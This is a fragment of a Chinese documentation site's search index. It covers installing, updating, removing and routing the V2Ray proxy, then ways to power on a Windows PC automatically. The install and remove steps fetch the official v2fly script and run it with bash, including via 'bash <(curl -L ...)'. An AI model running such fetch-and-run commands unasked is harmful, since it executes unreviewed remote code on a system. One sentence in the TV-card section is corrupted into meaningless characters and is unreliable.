\u5e76\u4e0d\u8981\u6c42\u65f6\u533a\u4e00\u81f4\u3002\u6bd4\u5982\u8bf4\u81ea\u4e2a\u513f\u7535\u8111\u4e0a\u7684\u65f6\u95f4\u662f\u5317\u4eac\u65f6\u95f4\uff08\u4e1c 8 \u533a\uff092017-07-31 12:08:31\uff0c\u4f46\u662f VPS \u4e0a\u7684\u65f6\u533a\u662f\u4e1c 9 \u533a\uff0c\u6240\u4ee5 VPS \u4e0a\u7684\u65f6\u95f4\u5e94\u8be5\u662f 2017-07-31 13:07:01 \u5230 2017-07-31 13:10:01 \u4e4b\u95f4\u624d\u80fd\u6b63\u5e38\u4f7f\u7528 V2Ray\u3002\u5f53\u7136\uff0c\u4e5f\u53ef\u4ee5\u81ea\u884c\u6539\u6210\u81ea\u5df1\u60f3\u8981\u7684\u65f6\u533a\u3002","title":"\u65f6\u95f4\u662f\u5426\u51c6\u786e"},{"location":"tool/v2ray/#cross-platform","text":"\u611f\u8c22 Golang \u7f16\u7a0b\u8bed\u8a00\u63d0\u4f9b\u7684\u7279\u6027\u548c\u539f\u4f5c\u8005\u7684\u7cbe\u5fc3\u8bbe\u8ba1\uff0cV2Ray \u53ef\u4ee5\u4e0d\u4f9d\u8d56\u5176\u5b83\u8f6f\u4ef6\uff08\u5e93\uff09\u800c\u8fd0\u884c\uff0c\u5e76\u4e14\u63d0\u4f9b\u4e86\u8de8\u5e73\u53f0\u652f\u6301\uff08\u5982\uff1a Windows, Linux, MacOS, BSD \u7b49\uff09\u3002\u4f46\u662f\u7531\u4e8e\u65b0\u624b\u5728\u5b66\u4e60\u4f7f\u7528\u8fc7\u7a0b\u4e2d\u53ef\u80fd\u4f1a\u9047\u5230\u5404\u79cd\u95ee\u9898\uff0c\u5374\u7f3a\u4e4f\u76f8\u5e94\u7684\u89e3\u51b3\u95ee\u9898\u7684\u80fd\u529b\uff0c\u56e0\u6b64\u5728 VPS \u4e0a\u5efa\u8bae\u4f7f\u7528 Debian 9.x, Debian 10 \u4ee5\u4e0a\u6216 Ubuntu 18.04 \u53ca\u4ee5\u4e0a\u7684 Linux \u53d1\u884c\u7248\u3002\u8bf7\u4e0d\u8981\u8ff7\u4fe1\u67d0\u4e2a\uff08\u4e9b\uff09\u201c\u6700\u7a33\u5b9a\u201d\u7684 Linux \u53d1\u884c\u7248\u3002","title":"Linux \u7248\u672c\u7684\u95ee\u9898"},{"location":"tool/v2ray/#install","text":"\u4e0e Shadowsocks \u4e0d\u540c\uff0c\u4ece\u8f6f\u4ef6\u4e0a V2Ray \u4e0d\u533a\u5206\u670d\u52a1\u5668\u7248\u548c\u5ba2\u6237\u7aef\u7248\uff0c\u4e5f\u5c31\u662f\u8bf4\u5728\u670d\u52a1\u5668\u548c\u5ba2\u6237\u7aef\u8fd0\u884c\u7684 V2Ray \u662f\u540c\u4e00\u4e2a\u8f6f\u4ef6\uff0c\u533a\u522b\u53ea\u662f\u914d\u7f6e\u6587\u4ef6\u7684\u4e0d\u540c\u3002 \u5728 Linux \u64cd\u4f5c\u7cfb\u7edf\uff0c V2Ray \u7684\u5b89\u88c5\u6709\u811a\u672c\u5b89\u88c5\u3001\u624b\u52a8\u5b89\u88c5\u3001\u7f16\u8bd1\u5b89\u88c5 3 \u79cd\u65b9\u5f0f\uff0c\u9009\u62e9\u5176\u4e2d\u4e00\u79cd\u5373\u53ef\uff0c\u672c\u6587\u4ec5\u63d0\u4f9b\u4f7f\u7528\u4f7f\u7528\u811a\u672c\u5b89\u88c5\u7684\u65b9\u6cd5\uff0c\u5e76\u4ec5\u63a8\u8350\u4f7f\u7528\u811a\u672c\u5b89\u88c5\uff0c\u8be5\u811a\u672c\u7531 V2Ray \u5b98\u65b9\u63d0\u4f9b\u3002\u8be5\u811a\u672c\u4ec5\u53ef\u4ee5\u5728 Debian \u7cfb\u5217\u6216\u8005\u652f\u6301 Systemd \u7684 Linux \u64cd\u4f5c\u7cfb\u7edf\u4f7f\u7528\u3002 $ curl -O https://raw.githubusercontent.com/v2fly/fhs-install-v2ray/master/install-release.sh $ bash install-release.sh # \u8bbe\u7f6e\u5f00\u673a\u81ea\u81ea\u52a8 $ systemctl enable v2ray # \u542f\u52a8V2Ray \u8bf7\u63d0\u524d\u914d\u7f6e\u597dv2ray.config $ systemctl start v2ray # \u67e5\u770bV2Ray\u8fd0\u884c\u60c5\u51b5 $ systemctl status v2ray","title":"\u5b89\u88c5"},{"location":"tool/v2ray/#config","text":"\u5173\u4e8e V2ray \u914d\u7f6e\uff0c\u8bf7\u53c2\u8003 v2ray-examples \u5185\u7684\u793a\u4f8b\u3002 \u56e0\u4e3a\u6ca1\u6709\u57df\u540d\u548c\u7f51\u7ad9\u8bc1\u4e66\uff0c\u6211\u53ea\u80fd\u4f7f\u7528VMess-HTTP\uff0c\u8fd9\u79cd\u7b80\u5355\u7684\u4f2a\u88c5\u6211\u7528\u4e86\u8fd1\u4e24\u5e74\u4e5f\u6ca1\u6709\u88ab\u5c01\u8fc7\uff0c\u5927\u6982\u662f\u56e0\u4e3a\u4e2a\u4eba\u4f7f\u7528\u6d41\u91cf\u5c11\uff0c\u4e5f\u6ca1\u6709\u5e72\u574f\u4e8b\u3002","title":"\u914d\u7f6e"},{"location":"tool/v2ray/#update","text":"\u5728 VPS\uff0c\u91cd\u65b0\u6267\u884c\u4e00\u904d\u5b89\u88c5\u811a\u672c\u5c31\u53ef\u4ee5\u66f4\u65b0\u4e86\uff0c\u5728\u66f4\u65b0\u8fc7\u7a0b\u4e2d\u4f1a\u81ea\u52a8\u91cd\u542f V2Ray\uff0c\u914d\u7f6e\u6587\u4ef6\u4fdd\u6301\u4e0d\u53d8\u3002 $ bash install-release.sh V2Ray \u7684\u66f4\u65b0\u7b56\u7565\u662f\u5feb\u901f\u8fed\u4ee3\uff0c\u6bcf\u5468\u66f4\u65b0(\u65e0\u610f\u5916\u7684\u60c5\u51b5\u4e0b)\u3002\u7248\u672c\u53f7\u7684\u683c\u5f0f\u662f vX.Y.Z\uff0c\u5982 v2.44.0\u3002v \u662f\u56fa\u5b9a\u7684\u5b57\u6bcd v\uff0cversion \u7684\u9996\u5b57\u6bcd\uff1bX\u3001Y\u3001Z \u90fd\u662f\u6570\u5b57\uff0cX \u662f\u5927\u7248\u672c\u53f7\uff0c\u6bcf\u5e74\u66f4\u65b0\u4e00\u4e2a\u5927\u7248\u672c(\u73b0\u5728\u662f v4.Y.Z\uff0cV2Ray \u5df2\u7ecf\u8d70\u5230\u4e86\u7b2c\u56db\u4e2a\u5e74\u5934)\uff0cY \u662f\u5c0f\u7248\u672c\uff0c\u6bcf\u5468\u4e94\u66f4\u65b0\u4e00\u4e2a\u5c0f\u7248\u672c\u3002Z \u662f\u533a\u5206\u6b63\u5f0f\u7248\u548c\u6d4b\u8bd5\u7248\uff0cZ \u662f 0 \u4ee3\u8868\u7740\u662f\u6b63\u5f0f\u7248\uff0c\u4e0d\u662f 0 \u8bf4\u660e\u662f\u6d4b\u8bd5\u7248\u3002\u4f8b\u5982\uff0cv4.7.0 \u662f\u6b63\u5f0f\u7248\uff0cv4.7.1 \u662f\u6d4b\u8bd5\u7248\uff0c\u5efa\u8bae\u53ea\u4f7f\u7528\u6b63\u5f0f\u7248\uff0c\u4e0d\u624b\u52a8\u6307\u5b9a\u7684\u60c5\u51b5\u4e0b V2Ray \u7684\u5b89\u88c5\u811a\u672c\u4e5f\u53ea\u4f1a\u5b89\u88c5\u6700\u65b0\u7684\u6b63\u5f0f\u7248\u3002","title":"\u5347\u7ea7\u66f4\u65b0"},{"location":"tool/v2ray/#remove","text":"# bash <(curl -L https://raw.githubusercontent.com/v2fly/fhs-install-v2ray/master/install-release.sh) --remove","title":"\u79fb\u9664"},{"location":"tool/v2ray/#third-party-gui-clients","text":"V2rayN : V2RayN \u662f\u4e00\u4e2a\u57fa\u4e8e V2Ray \u5185\u6838\u7684 Windows \u5ba2\u6237\u7aef\u3002 Qv2ray : \u8de8\u5e73\u53f0 V2Ray \u5ba2\u6237\u7aef\uff0c\u652f\u6301 Linux\u3001Windows\u3001macOS\uff0c\u53ef\u901a\u8fc7\u63d2\u4ef6\u7cfb\u7edf\u652f\u6301 SSR / Trojan / Trojan-Go / NaiveProxy \u7b49\u534f\u8bae\u3002 SagerNet : SagerNet \u662f\u4e00\u4e2a\u57fa\u4e8e V2Ray \u7684 Android \u901a\u7528\u4ee3\u7406\u5e94\u7528\u3002 v2rayNG : \u4e00\u6b3e\u5b89\u5353V2Ray\u5ba2\u6237\u7aef\uff0c\u652f\u6301 Xray core \u548c v2fly core\u3002","title":"\u7b2c\u4e09\u65b9\u56fe\u5f62\u5ba2\u6237\u7aef"},{"location":"tool/v2ray/#routing","text":"V2Ray \u5185\u5efa\u4e86\u4e00\u4e2a\u8def\u7531\u6a21\u5757\uff0c\u53ef\u4ee5\u5c06\u5165\u7ad9\u6570\u636e\u6309\u9700\u6c42\u7531\u4e0d\u540c\u7684\u51fa\u7ad9\u8fde\u63a5\u53d1\u51fa\uff0c\u4ee5\u8fbe\u5230\u6309\u9700\u4ee3\u7406\u7684\u76ee\u7684\u3002\u8fd9\u4e00\u529f\u80fd\u7684\u5e38\u89c1\u7528\u6cd5\u662f\u5206\u6d41\u56fd\u5185\u5916\u6d41\u91cf\u3002V2Ray \u53ef\u4ee5\u901a\u8fc7\u5185\u90e8\u673a\u5236\u5224\u65ad\u4e0d\u540c\u56fd\u5bb6\u6216\u5730\u533a\u7684\u6d41\u91cf\uff0c\u7136\u540e\u5c06\u5b83\u4eec\u53d1\u9001\u5230\u4e0d\u540c\u7684\u51fa\u7ad9\u4ee3\u7406\u3002 \u5728\u4e0b\u8f7d V2Ray \u7684\u65f6\u5019\uff0c\u4e0b\u8f7d\u7684\u538b\u7f29\u5305\u6709\u4e00\u4e2a geosite.dat \u3002\u8fd9\u4e2a\u6587\u4ef6\u662f\u5728\u8def\u7531\u529f\u80fd\u91cc\u7528\u5230\u7684\uff0c\u6587\u4ef6\u5185\u7f6e\u4e86\u8bb8\u591a \u5e38\u89c1\u7684\u7f51\u7ad9\u57df\u540d \u3002\u4f7f\u7528\u65b9\u5f0f\uff1a geosite:listname \uff0c\u5982 geosite:google \u8868\u793a\u5bf9 domain-list-community \u9879\u76ee data \u76ee\u5f55\u91cc\u7684 google \u6587\u4ef6\u5185\u5305\u542b\u7684\u57df\u540d\uff0c\u8fdb\u884c\u8def\u7531\u7b5b\u9009\u6216 DNS \u7b5b\u9009\u3002 Block (\u963b\u6b62)\uff1a \u62e6\u622a\u5411\u5916\u53d1\u9001\u7684\u8fde\u63a5\u8bf7\u6c42\uff0c\u7981\u6b62\u8fde\u7f51\u3002 Direct (\u76f4\u8fde)\uff1a \u76f4\u63a5\u8bbf\u95ee\u5916\u90e8\u7f51\u7edc\uff0c\u4e0d\u8d70\u4ee3\u7406\u3002 Proxy (\u4ee3\u7406)\uff1a \u5141\u8bb8\u901a\u8fc7\u4ee3\u7406\u8fde\u63a5\u4e0a\u7f51\u3002 Proxy(\u4ee3\u7406)\u7684Domain\u89c4\u5219: github.com, githubassets.com, githubusercontent.com, # \u4e0b\u4e00\u884c\u8c37\u6b4c\u4ea7\u54c1\u56fe\u6807, googleusercontent.com Direct(\u76f4\u8fde)\u7684Domain\u89c4\u5219: postman.com, domain:aws.amazon.com, domain:amazonaws.com, adblockplus.org, safesugar.net, #\u3010\u4ee5\u4e0b\u5168\u90e8\u662fgeo\u9884\u5b9a\u4e49\u57df\u540d\u5217\u8868\u3011, # \u4e0b\u4e00\u884c\u662f\u6240\u6709\u79c1\u6709\u57df\u540d, geosite:private, # \u4e0b\u4e00\u884c\u5305\u542b\u5e38\u89c1\u5927\u9646\u7ad9\u70b9\u57df\u540d\u548cCNNIC\u7ba1\u7406\u7684\u5927\u9646\u57df\u540d\uff0c\u5373geolocation-cn\u548ctld-cn\u7684\u5408\u96c6, geosite:cn, # \u4e0b\u4e00\u884c\u5305\u542b\u6240\u6709Adobe\u65d7\u4e0b\u57df\u540d, geosite:adobe, # \u4e0b\u4e00\u884c\u5305\u542b\u6240\u6709Adobe\u6b63\u7248\u6fc0\u6d3b\u57df\u540d, geosite:adobe-activation, # \u4e0b\u4e00\u884c\u5305\u542b\u6240\u6709\u5fae\u8f6f\u65d7\u4e0b\u57df\u540d, geosite:microsoft, # \u4e0b\u4e00\u884c\u5305\u542b\u5fae\u8f6fmsn\u76f8\u5173\u57df\u540d\u5c11\u6570\u4e0e\u4e0a\u4e00\u884c\u5fae\u8f6f\u5217\u8868\u91cd\u590d, geosite:msn, # \u4e0b\u4e00\u884c\u5305\u542b\u6240\u6709\u82f9\u679c\u65d7\u4e0b\u57df\u540d, geosite:apple, # \u4e0b\u4e00\u884c\u5305\u542b\u53ef\u76f4\u8fde\u8bbf\u95ee\u8c37\u6b4c\u7f51\u5740\uff0c\u9700\u8981\u66ff\u6362\u4e3a\u52a0\u5f3a\u7248GEO\uff0c\u5426\u5219\u5220\u9664\u6b64\u884c, geosite:google-cn, # \u4e0b\u4e00\u884c\u5305\u542b\u53ef\u76f4\u8fde\u8bbf\u95ee\u82f9\u679c\u7f51\u5740\uff0c\u9700\u8981\u66ff\u6362\u4e3a\u52a0\u5f3a\u7248GEO\uff0c\u5426\u5219\u5220\u9664\u6b64\u884c, geosite:apple-cn Direct(\u76f4\u8fde)\u7684IP\u89c4\u5219: # \u4e2d\u56fd\u5927\u9646 IP \u5730\u5740 geoip:cn, # \u6240\u6709\u79c1\u6709\u5730\u5740\uff0c\u5982 127.0.0.1 geoip:private Block(\u963b\u6b62)\u7684Domain\u89c4\u5219: # \u5305\u542b\u4e86\u5e38\u89c1\u7684\u5e7f\u544a\u57df\u540d\uff0c\u4ee5\u53ca\u5e7f\u544a\u63d0\u4f9b\u5546\u7684\u57df\u540d\u3002 geosite:category-ads-all \u8be6\u7ec6\u89c4\u5219\u53c2\u8003 Routing \u8def\u7531","title":"\u8def\u7531\u89c4\u5219"},{"location":"tool/v2ray/#recommended-vpn","text":"\u540c\u4e8b\u63a8\u8350\u7684VPN\uff0c\u672c\u4eba\u5e76\u6ca1\u6709\u7528\u8fc7\uff0c\u53ea\u6b64\u8bb0\u5f55\uff0c\u4e0d\u53d1\u8868\u610f\u89c1\u3002 vpnclient \u5feb\u8fdevpn","title":"\u540c\u4e8b\u63a8\u8350\u7684VPN"},{"location":"windows_development/automatic_power_up/","text":"Automatic Power Up \uf0c1 \u81ea\u52a8\u5f00\u673a \u65b9\u6cd5\u4e00\uff1aBIOS \uf0c1 \u9996\u5148\u5f00\u673a\u540e\u6309\u4f4fDelete\u952e\uff0c\u5c31\u662f\u5e73\u5e38\u5e38\u7528\u7684\u5220\u9664\u6309\u952e(\u89c1\u56fe1)\uff0c\u7136\u540e\u5c31\u4f1a\u8fdb\u5165\u5230BIOS\u754c\u9762\u3002\u867d\u7136\u662f\u4e00\u4e2a\u6ee1\u773cE\u6587\u7684\u84dd\u8272\u4e16\u754c\uff0c\u4f46\u4e0d\u8981\u5bb3\u6015\uff0c\u6ca1\u6709\u95ee\u9898\u7684\u3002 \u5728BIOS\u8bbe\u7f6e\u4e3b\u754c\u9762\u4e2d\u9009\u62e9\u201cPower\u201d\u9009\u9879(\u89c1\u56fe2)\uff0c\u8fdb\u5165\u7535\u6e90\u7ba1\u7406\u7a97\u53e3\u3002\u6709\u4e9b\u673a\u5668\u662f\u5728\u201cPower Management Setup\u201d\u91cc\u9762\u3002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u201cAutomatic Power Up(\u5b9a\u65f6\u5f00\u673a\uff0c\u6709\u4e9b\u673a\u5668\u9009\u9879\u4e3aResume By Alarm)\u201d\u9009\u9879\u662f\u5173\u95ed\u7684\uff0c\u5c06\u5149\u6807\u79fb\u5230\u8be5\u9879(\u89c1\u56fe3)\uff0c\u7528\u201cPagedown\u201d\u952e\u5c06\u201cDisabled\u201d\u6539\u4e3a\u201cEnabled\u201d\u3002 \u6b64\u65f6\u201cAutomatic Power Up\u201d\u9009\u9879\u4f1a\u5f39\u51fa\u4e00\u4e2a\u83dc\u5355\uff0c\u91cc\u9762\u6709\u4e09\u9879\u9009\u62e9\uff1a\u201cDisabled\u3001Every Day\u548cBy Date\u201d(\u89c1\u56fe4)\uff0c\u610f\u601d\u662f\u201c\u7981\u6b62\u3001\u6bcf\u5929\u548c\u6307\u5b9a\u65e5\u671f\u201d\u3002\u5bf9\u4e8e\u4e0a\u73ed\u65cf\u6765\u8bf4\uff0c\u6211\u4eec\u63a8\u8350\u7b2c\u4e8c\u9879\uff0c\u8fd9\u65f6\u4f1a\u8df3\u51fa\u4e00\u4e2a\u65e5\u671f\u548c\u65f6\u95f4\u8bbe\u7f6e\u3002 \u606d\u559c\u60a8\uff0c\u5927\u529f\u5df2\u7ecf\u544a\u6210\u4e00\u534a\u4e86\uff0c\u8fd9\u65f6\u5c06\u5149\u6807\u5148\u79fb\u5230\u201cTime Alarm(\u5f00\u673a\u65f6\u95f4)\u201d\u4e0a\uff0c\u7528\u201cPageup\u201d\u3001\u201cPagedown\u201d\u8bbe\u5b9a\u597d(\u89c1\u56fe5)\u3002 \u5982\u679c\u60a8\u8bbe\u5b9a\u7684\u662f\u5236\u5b9a\u65e5\u671f\uff0c\u5219\u8fd8\u8981\u5728\u201cDate Alarm(\u5f00\u673a\u65e5\u671f)\u201d\u4e0a\u505a\u4e00\u4e2a\u8bbe\u5b9a\u3002\u5f53\u7136\uff0c\u4e0d\u540c\u7684\u4e3b\u677f\u529f\u80fd\u6709\u5dee\u5f02\uff0c\u6709\u7684\u6bcf\u8bbe\u7f6e\u4e00\u6b21\uff0c\u53ea\u80fd\u4f7f\u7528\u4e00\u6b21\uff0c\u800c\u6709\u7684\u53ef\u4ee5\u8bbe\u7f6e\u4e00\u4e2a\u5468\u671f\u3002 \u6700\u540e\u4e00\u6b65\u4e86\uff0c\u8fd9\u56de\u771f\u7684\u8981\u5927\u529f\u544a\u6210\u4e86\uff0c\u5c31\u662f\u9009\u62e9\u201cExit Saving Changes\u201d(\u89c1\u56fe6)\uff0c\u4fdd\u5b58\u5e76\u9000\u51fa\uff0c\u5927\u90e8\u5206\u673a\u5668\u90fd\u6709\u70ed\u952e\uff0c\u4e00\u822c\u90fd\u662fF10\u3002\u63a5\u7740\u673a\u5668\u4f1a\u91cd\u65b0\u542f\u52a8\uff0cOK\uff0c\u606d\u559c\u4f60\uff0c\u4f60\u7684\u673a\u5668\u53ef\u4ee5\u81ea\u52a8\u4e0a\u73ed\u4e86\u3002 \u600e\u4e48\u6837\uff0c\u4f60\u73b0\u5728\u7684\u673a\u5668\u662f\u5426\u53ef\u4ee5\u6bcf\u5929\u81ea\u52a8\u5f00\u5de5\u4e86\u5462\uff0c\u5f53\u7136\u524d\u63d0\u662f\u4f60\u4e5f\u4e0d\u8981\u8fdf\u5230\u5440\uff0c\u5426\u5219\u5c31\u7b97\u5b83\u5f00\u673a\u4e86\u8fd8\u662f\u5728\u90a3\u91cc\u6f2b\u957f\u7684\u7b49\u5f85\uff0c\u522b\u6307\u671b\u5b83\u80fd\u81ea\u5df1\u5e72\u6d3b\u5466\u3002 \u6700\u540e\u63d0\u9192\u5927\u5bb6\u4e00\u53e5\uff0c\u5c31\u662f\u5728\u5468\u672b\u7684\u65f6\u5019\u4e00\u5b9a\u8981\u60f3\u7740\u5173\u95ed\u7535\u6e90\uff0c\u5426\u5219\u5468\u516d\u5b83\u8fd8\u662f\u4f1a\u6309\u65f6\u5f00\u673a\u7684\uff0c\u867d\u7136\u53ef\u4ee5\u518d\u8bbeBIOS\u5173\u95ed\uff0c\u4f46\u603b\u5f52\u6ca1\u6709\u5173\u95ed\u7535\u6e90\u6765\u7684\u5bb9\u6613\uff0c\u60a8\u8bf4\u5462 \u65b9\u6cd5\u4e8c\uff1a\u5229\u7528\u952e\u76d8/\u9f20\u6807\u5f00\u673a \uf0c1 \u5982\u679c\u7535\u8111\u673a\u7bb1\u653e\u7f6e\u5728\u96be\u4ee5\u89e6\u53ca\u7684\u5730\u65b9\uff0c\u4f7f\u7528\u952e\u76d8/\u9f20\u6807\u5f00\u673a\u662f\u4e00\u4e2a\u4e0d\u9519\u7684\u65b9\u6848\u3002\u4f46\u8981\u6ce8\u610f\u7684\u662f\u6b64\u529f\u80fd\u53ea\u652f\u6301\u4ee5PS/2\u63a5\u53e3\u8fde\u63a5\u7684\u952e\u76d8\u548c\u9f20\u6807\uff0c\u4f7f\u7528USB\u63a5\u53e3\u8fde\u63a5\u5219\u4e0d\u884c\u3002 \u542f\u7528\u4e3b\u677fBIOS\u4e2d\u201cPower On By PS/2 Keyboard\u201d\u7684\u9009\u9879\uff0c\u5c31\u53ef\u4ee5\u9009\u62e9\u4e0d\u540c\u7684\u5f00\u673a\u70ed\u952e\uff0c\u5982Ctrl+E\u662f\u6700\u5e38\u89c1\u7684\u5f00\u673a\u70ed\u952e\u3002 \u6216\u8005\u9009\u201cPower Key\u201d\u4e00\u9879\u540e\uff0c\u53ef\u7528\u952e\u76d8\u4e0a\u5355\u72ec\u8bbe\u8ba1\u7684\u4e00\u4e2a\u7535\u6e90\u952e\u5f00\u673a\uff0c\u4f46\u524d\u63d0\u662f\u53ea\u6709\u90e8\u5206\u7b26\u5408Keyboard 98\u6280\u672f\u89c4\u683c\u7684\u952e\u76d8\u624d\u652f\u6301\u6b64\u529f\u80fd\u3002\u5f53\u7136\uff0c\u673a\u7bb1\u4e0a\u7684\u7535\u6e90\u6309\u94ae\u4ecd\u7136\u80fd\u591f\u4f7f\u7528\u3002 \u81f3\u4e8e\u7528\u9f20\u6807\u5f00\u673a\u4e5f\u5f88\u7b80\u5355\uff0c\u5728BIOS\u4e2d\u7684\u8bbe\u7f6e\u9009\u9879\u4e0e\u952e\u76d8\u5f00\u673a\u8bbe\u7f6e\u7c7b\u4f3c\uff0c\u7136\u540e\u53ea\u987b\u8f7b\u70b9\u9f20\u6807\u6309\u94ae\u5c31\u80fd\u542f\u52a8\u7535\u8111\u3002 \u65b9\u6cd5\u4e09\uff1a\u5229\u7528\u7f51\u7edc\u5524\u9192\u5f00\u673a \uf0c1 \u8981\u4f7f\u7528Wake On LAN \uff08WOL\uff09\u7f51\u7edc\u5524\u9192\u529f\u80fd\uff0c\u9700\u8981\u7f51\u5361\u652f\u6301\uff0c\u800c\u5177\u5907WOL\u529f\u80fd\u7684\u7f51\u5361\u90fd\u6709\u4e00\u6761\u7279\u6b8a\u7684\u4fe1\u53f7\u7ebf\u8fde\u63a5\u4e3b\u677f\u4e0a\u7684WOL\u63a5\u53e3\uff0c\u8d1f\u8d23\u5c06\u5f00\u673a\u4fe1\u53f7\u4f20\u9001\u81f3\u4e3b\u677f\u3002\u4e0d\u8fc7\uff0c\u76ee\u524d\u5177\u5907WOL\u63a5\u53e3\u7684\u4e3b\u677f\u5df2\u7ecf\u4e0d\u591a\uff0c\u5382\u5546\u6539\u4e3a\u5728\u4e3b\u677f\u5185\u7f6e\u7684\u7f51\u7edc\u82af\u7247\u4e0a\u63d0\u4f9bWOL\u529f\u80fd\u3002 WOL\u7684\u539f\u7406\u662f\u7535\u8111\u5728\u5f00\u673a\u65f6\u6216S5\u4f11\u7720\u6a21\u5f0f\uff08Suspend to Disk\uff0c\u4f11\u7720\u5230\u786c\u76d8\uff09\u4e0b\uff0c\u7f51\u5361\u4ecd\u4ee5\u6781\u4f4e\u7535\u538b\u7ef4\u6301\u57fa\u672c\u8fd0\u4f5c\uff0c\u8fd9\u65f6\u5728\u7f51\u7edc\u4e0a\u7684\u5176\u4ed6\u7535\u8111\u4fbf\u53ef\u901a\u8fc7\u8f6f\u4ef6\u4f20\u9001\u4e00\u4e2a\u79f0\u4e3a\u201cMagic Packet\u201d\u7684\u795e\u5947\u5c01\u5305\u81f3\u8981\u5524\u9192\u7684\u7535\u8111\u3002 \u7f51\u5361\u63a5\u6536\u4fe1\u53f7\u540e\u5c31\u4f1a\u53d1\u51fa\u5f00\u673a\u4fe1\u53f7\u81f3\u4e3b\u677f\uff0c\u4f7f\u4e3b\u677f\u542f\u52a8\u3002\u7531\u4e8e\u7535\u8111\u5728\u5524\u9192\u524d\u4ecd\u5904\u4e8e\u5f00\u673a\u72b6\u6001\uff0c\u56e0\u6b64\u6211\u4eec\u8981\u77e5\u9053\u7f51\u5361\u7684MAC\u5730\u5740\uff08\u6bcf\u5f20\u7f51\u5361\u5747\u6709\u81ea\u5df1\u72ec\u7279\u7684MAC\u5730\u5740\uff0c\u8f6f\u4ef6\u4ee5\u6b64\u8fdb\u884c\u8bc6\u522b\uff09\u3002 \u7f51\u7edc\u5524\u9192\u529f\u80fd\u7684\u5177\u4f53\u4f7f\u7528\u65b9\u6cd5\u5982\u4e0b\uff1a\u9996\u5148\u5728\u4e3b\u677fBIOS\u4e2d\u6253\u5f00WOL\u9009\u9879\u3002\u6ce8\u610f\u90e8\u4efd\u4e3b\u677f\u53ea\u652f\u6301\u4eceS5\u6a21\u5f0f\u4e2d\u5524\u9192\uff08Wake On LAN from S5\uff09\u3002 \u5176\u6b21\uff0c\u4ece\u7f51\u4e0a\u4e0b\u8f7dWOL\u8f6f\u4ef6\u3002\u8fd9\u4e2a\u540d\u4e3a\u201cMagic packet\u201d\u7684\u7f51\u7edc\u5524\u9192\u8f6f\u4ef6\uff0c\u5176\u8bbe\u7f6e\u548c\u4f7f\u7528\u65b9\u6cd5\u90fd\u5f88\u7b80\u5355\u3002\u8fd0\u884c\u540e\u5728\u5176\u64cd\u4f5c\u754c\u9762\u4e2d\u53ea\u67095\u4e2a\u9009\u9879\u3002 \u5176\u4e2d\uff1a\u7f51\u5361\u7684\u201c\uff08MAC Address\uff09\uff08MAC\u5730\u5740\uff09\u201d\u4e00\u680f\uff0c\u7528\u6237\u53ef\u5728Windows\u64cd\u4f5c\u7cfb\u7edf\u7684\u547d\u4ee4\u884c\u6a21\u5f0f\u4e0b\u8f93\u5165\u201cipconfig/all\u201d\u7684\u6307\u4ee4\u6765\u83b7\u5f97\u3002 \u53e6\u5916\uff0c\u201cInternet Address\u201d\uff08\u4e92\u8054\u7f51\u5730\u5740\uff09\u4e00\u680f\u662f\u8981\u8fdb\u884c\u5e7f\u64ad\u7684\u680f\u76ee\uff0c\u5728\u6b64\u680f\u53ca\u201cSubnet Mask\u201d\u4e00\u680f\u4e2d\u8f93\u5165\u201c255\u3001255\u3001255\u3001255\u201d\u5219\u53ef\u8fdb\u884c\u672c\u5730\u5e7f\u64ad\uff08Local Broadcast\uff09\u3002\u7b2c\u56db\u680f\u4e3a\u201cSend Options\u201d\uff0c\u5e94\u9009\u62e9\u201cLocal Subnet\u201d\u3002\u7b2c\u4e94\u680f\u201cRemote Port Number\u201d\u5219\u968f\u610f\u8f93\u5165\u3002 \u6ce8\u610f\uff0c\u4e0a\u8ff0\u8bbe\u7f6e\u53ea\u9488\u5bf9\u672c\u5730\u7f51\u7edc\uff08Local LAN\uff09\u800c\u8a00\u3002\u5982\u8981\u7ecf\u4e92\u8054\u7f51\u8fdb\u884c\u5524\u9192\u5219\u6d89\u53ca\u66f4\u591a\u7684\u95ee\u9898\uff0c\u5728\u6b64\u4e0d\u4f5c\u8ba8\u8bba\u3002\u6700\u540e\u5355\u51fb\u754c\u9762\u4e0b\u65b9\u7684\u201cWake Me UP\u201d\u6309\u94ae\u5373\u53ef\u5b9e\u73b0\u4ece\u7f51\u7edc\u5524\u9192\u7535\u8111\u3002 \u65b9\u6cd5\u56db\uff1a\u7528\u7535\u89c6\u5361\u5f00\u673a \uf0c1 \u5177\u5907\u81ea\u52a8\u5f00\u673a\u529f\u80fd\u7684\u7535\u89c6\u5361\u5df2\u7ecf\u5927\u91cf\u9762\u5e02\uff0c\u5c06\u5176\u8fde\u63a5\u597d\u540e\uff0c\u5229\u7528\u7535\u89c6\u5361\u63d0\u4f9b\u7684\u8f6f\u4ef6\u8bbe\u7f6e\u5f00\u673a\u65f6\u95f4\u5373\u53ef\u3002 \u7535\u89c6\u5361\u7684\u81ea\u52a8\u5f00\u673a\u65b9\u5f0f\u5927\u81f4\u53ef\u4ee5\u5206\u4e3a\u4e09\u79cd\u65b9\u5251\u65f1\u8c1d\u6062\u8d28\u94a6\u5b32 \u5f11\u7f38\u8fdc \u03b4\u827f\u725f \u7f5a \u67d8\u5189 \u6d9e\u7f2d\u806a\u54c2\u6c32\u7f21\u6d8c \u91c9\u50ee \u6620\uff1f\u53e6\u4e00\u79cd\u662f\u5229\u7528\u4f11\u7720\u65b9\u5f0f\u5f00\u673a\u7684\u7535\u89c6\u5361\u3002 \u5176\u4e2d\uff0c\u7b2c\u4e8c\u79cd\u65b9\u6cd5\u7531\u4e8e\u7535\u8111\u5e76\u672a\u771f\u6b63\u5173\u673a\uff0c\u5373\u4ecd\u5728\u6d88\u8017\u7535\u529b\uff0c\u6240\u4ee5\u5e76\u4e0d\u662f\u6240\u6709\u7528\u6237\u90fd\u4e50\u610f\u91c7\u7528\u3002\u4e0b\u9762\u4e3b\u8981\u4ecb\u7ecd\u7b2c\u4e00\u79cd\u81ea\u52a8\u5f00\u673a\u65b9\u6cd5\u7684\u5177\u4f53\u64cd\u4f5c\u3002 \u9996\u5148\uff0c\u7528\u6237\u5728\u5b89\u88c5\u65f6\u8981\u5c06\u673a\u7bb1\u4e0a\u7535\u8111\u5f00\u5173\u6309\u94ae\u7684\u5f15\u7ebf\u63a5\u811a\u4e0e\u7535\u89c6\u5361\u7684\u201cPower Switch\u201d\u63a5\u811a\u76f8\u8fde\u63a5\uff08\u7b14\u8005\u4ee5\u5eb7\u535aX800\u7535\u89c6\u5361\u4e3a\u4f8b\uff09\u3002 